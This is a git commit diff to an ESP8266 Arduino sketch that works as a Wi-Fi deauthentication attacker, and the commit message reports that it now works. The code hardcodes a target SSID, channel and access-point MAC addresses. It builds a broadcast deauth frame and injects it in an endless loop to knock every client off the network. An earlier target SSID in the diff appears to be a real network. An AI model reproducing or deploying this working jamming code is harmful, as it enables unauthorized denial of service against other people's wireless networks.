b7a1bddafb11cb49b097d7366a8d3e96226def40
Grant L. <56404949+GrantjyLi@users.noreply.github.com>
2025-03-30 21:55:42 -0400

    code works now???
    use arduino IDE with the settings from Spacehun's deauther. It's really weird

--- Deauther/Deauther.ino
+++ Deauther/Deauther.ino
@@ -6,34 +6,23 @@ extern "C" {
 
 #define NUMNET 30
 #define MAC_ADDR_LEN 6
+#define PACKET_SIZE 26
 
 uint8_t numNetworks = 0;
 uint8_t* knownBSSIDS[NUMNET];
 bool found;
 
 uint8_t targetBSSID[MAC_ADDR_LEN];
-uint8_t targetChannel = 2;
-const char* targetSSID = "bowenIntranetFibre";
+uint8_t targetChannel = 7;
+const char* targetSSID = "home.wifi.misc";
 
-uint8_t packetSize;
-
-// uint8_t deauthPacket[26] = {
-// /*0 - 1*/  0xC0, 0x00, // Frame Control
-// /*2 - 3*/  0x00, 0x00, // Duration
-// /*4 - 9*/  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast) (all 0xFF means to everyone instead of a specific device)
-// /*10 - 15*/  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP MAC)
-// /*16 - 21*/  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP MAC)
-// /*22 - 23*/  0xFF, 0xFF, // Fragment & Sequence number
-// /*24 - 25*/  0x01, 0x00  // Reason code 1 (no reason given)
-// };
-
-uint8_t deauthPacket[26] = {
-  /*0 - 1*/  0xC0, 0x00, // Frame Control
+uint8_t deauthPacket[PACKET_SIZE] = {
+  /*0 - 1*/  0xc0, 0x00, // Frame Control
   /*2 - 3*/  0x00, 0x00, // Duration
-  /*4 - 9*/  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast) (all 0xFF means to everyone instead of a specific device)
+  /*4 - 9*/  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination (broadcast) (all 0xff means to everyone instead of a specific device)
   /*10 - 15*/  0xbc, 0xc7, 0x46, 0xff, 0x2e, 0xd4, // Source (AP MAC)
   /*16 - 21*/  0xe4, 0xfa, 0xc4, 0xce, 0x6b, 0xfa, // BSSID (AP MAC)
-  /*22 - 23*/  0xFF, 0xFF, // Fragment & Sequence number
+  /*22 - 23*/  0x00, 0x00, // Fragment & Sequence number
   /*24 - 25*/  0x01, 0x00  // Reason code 1 (no reason given)
 };
 
@@ -43,37 +32,39 @@ void setup() {
   Serial.printf("Deauthing %s\n", targetSSID);
   found = false;
 
+  WiFi.mode(WIFI_STA);
   wifi_promiscuous_enable(1);
 
   delay(100);
 }
 
 void loop() {
-  if(!found){
-    Serial.println("Trying to find target...");
-    findNewNetworks();
-  }else{
-    Serial.println("Deauthing...");
-    deauthAttack(targetBSSID);
-  }
-  
-  delay(20);
+  // if(!found){
+  //   Serial.println("Trying to find target...");
+  //   findNewNetworks();
+  // }else{
+  //   Serial.println("Deauthing...");
+  //   deauthAttack();
+  // }
+
+  deauthAttack();
 }
 // void deauthAttack() {
-void deauthAttack(uint8_t* apMac) {
-  targetChannel = 7;
+void deauthAttack() {
   wifi_set_channel(targetChannel);//same channel as target AP
-  uint8_t newPacket[packetSize];
-  memcpy(newPacket, deauthPacket, packetSize);
+  uint8_t newPacket[PACKET_SIZE];
+  memcpy(newPacket, deauthPacket, PACKET_SIZE);
 
   // memcpy(&newPacket[10], apMac, MAC_ADDR_LEN);
   // memcpy(&newPacket[16], apMac, MAC_ADDR_LEN);
-
+  int result;
   while (true){
-    if(wifi_send_pkt_freedom(newPacket, 26, 0) != 0){
-      Serial.println("DEAUTH PACKET SENT");
+    result = wifi_send_pkt_freedom(newPacket, PACKET_SIZE, 0);
+
+    if(result != 0){
+      Serial.printf("DEAUTH PACKET FAILED: %d\n", result);
     }else{
-      Serial.println("DEAUTH PACKET FAILED");
+      Serial.printf("DEAUTH PACKET SENT: %d\n", result);
     }
     delay(20);  // Adjust delay as needed
   }
